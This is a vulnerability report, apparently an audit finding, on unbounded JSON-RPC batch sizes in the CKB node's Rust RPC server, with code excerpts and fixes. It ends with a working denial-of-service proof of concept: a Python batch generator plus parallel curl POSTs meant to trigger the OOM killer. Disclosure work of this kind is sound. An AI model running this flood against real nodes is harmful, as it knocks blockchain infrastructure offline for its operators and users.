### Title
Unbounded JSON-RPC Batch Request Size Causes Memory Exhaustion and Node DoS — (`File: rpc/src/server.rs`)

---

### Summary

The CKB JSON-RPC server has no enforced default limit on the number of calls in a JSON-RPC batch request. The `rpc_batch_limit` guard is explicitly disabled in the shipped default configuration. An RPC caller can submit a single HTTP POST containing an arbitrarily large JSON array of calls, forcing the node to allocate unbounded memory and CPU, which can exhaust process resources and crash the node.

---

### Finding Description

`rpc/src/server.rs` builds the axum HTTP router and registers a single `handle_jsonrpc` handler for all POST traffic. No concurrency-limiting or request-throttling middleware is added to the router stack:

```rust
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())
    .layer(TimeoutLayer::with_status_code(
        StatusCode::REQUEST_TIMEOUT,
        Duration::from_secs(30),
    ))
    .layer(Extension(stream_config));
``` [1](#0-0) 

Inside `handle_jsonrpc`, a batch request is processed only after an optional guard:

```rust
Request::Batch(calls) => {
    if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
        && calls.len() > *batch_size
    {
        return make_error_response(...);
    }

    let stream = stream::iter(calls)
        .then(move |call| {
            let io = Arc::clone(&io);
            async move { io.handle_call(call, T::default()).await }
        })
        .filter_map(|response| async move { response });
    ...
}
``` [2](#0-1) 

`JSONRPC_BATCH_LIMIT` is a `OnceLock<usize>` that is only initialized when `config.rpc_batch_limit` is `Some`:

```rust
if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
    let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
}
``` [3](#0-2) 

The shipped default configuration explicitly leaves this option commented out:

```toml
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
``` [4](#0-3) 

The `RpcConfig` struct confirms `rpc_batch_limit` is `Option<usize>` with no default value, so it is `None` unless the operator explicitly sets it: [5](#0-4) 

When `JSONRPC_BATCH_LIMIT` is unset (the default), `JSONRPC_BATCH_LIMIT.get()` returns `None`, the guard is skipped entirely, and `stream::iter(calls)` iterates over an arbitrarily large `Vec<Call>` — every element is deserialized, dispatched, and its response buffered in memory before the HTTP response is flushed.

---

### Impact Explanation

An attacker sends one HTTP POST to the RPC endpoint containing a JSON array with tens of thousands of calls (e.g., `get_block`, `get_transaction`, `get_cells`). Each call allocates heap memory for deserialization, handler state, and the response object. Because all calls are collected before streaming the response, memory grows proportionally to batch size with no back-pressure. On a default Linux system, the OOM killer terminates the `ckb` process, taking down the node entirely — halting block relay, transaction propagation, and mining.

**Impact: High** — node crash causes complete loss of availability: peers disconnect, the mempool is lost, and the operator must manually restart.

---

### Likelihood Explanation

**Likelihood: High.**

- The default configuration ships with `rpc_batch_limit` commented out, so every node that has not manually added this line is vulnerable.
- The RPC default bind address is `127.0.0.1:8114`, but many operators expose it on `0.0.0.0` for dApps, wallets, and block explorers; the config itself warns about this but does not enforce localhost-only.
- Even on a localhost-only deployment, any co-located process (a compromised dApp, a malicious script, a shared-hosting tenant) qualifies as an RPC caller — an explicitly in-scope attacker role.
- The attack requires a single HTTP request with a large JSON body; no authentication, no special privileges, no prior knowledge beyond the open RPC port.

---

### Recommendation

1. **Set a safe default for `rpc_batch_limit`** in `resource/ckb.toml` (e.g., `rpc_batch_limit = 2000`) so the guard is active out of the box without requiring operator action.
2. **Add a `tower::limit::ConcurrencyLimitLayer`** (or equivalent) to the axum router in `start_server` to cap the number of simultaneously in-flight HTTP requests, mirroring the Throttle middleware pattern from the report.
3. **Stream batch responses lazily** rather than collecting all results before sending, to reduce peak memory per request.

---

### Proof of Concept

```bash
# Generate a batch of 100,000 get_tip_block_number calls
python3 -c "
import json, sys
calls = [{'jsonrpc':'2.0','method':'get_tip_block_number','params':[],'id':i} for i in range(100000)]
sys.stdout.write(json.dumps(calls))
" > big_batch.json

# Send to a default CKB node (adjust host/port as needed)
curl -s -X POST \
  -H 'Content-Type: application/json' \
  --data @big_batch.json \
  http://127.0.0.1:8114/ > /dev/null &

# Repeat in parallel to amplify memory pressure
for i in $(seq 1 20); do
  curl -s -X POST -H 'Content-Type: application/json' \
    --data @big_batch.json http://127.0.0.1:8114/ > /dev/null &
done
wait
```

With `rpc_batch_limit` absent from `ckb.toml`, the node processes all 100,000 calls per request with no rejection. Twenty concurrent such requests saturate available RAM, triggering the OOM killer and crashing the `ckb` process. The root cause is the unguarded `stream::iter(calls)` path in `handle_jsonrpc` combined with the opt-in (rather than opt-out) nature of `rpc_batch_limit`. [2](#0-1) [4](#0-3)
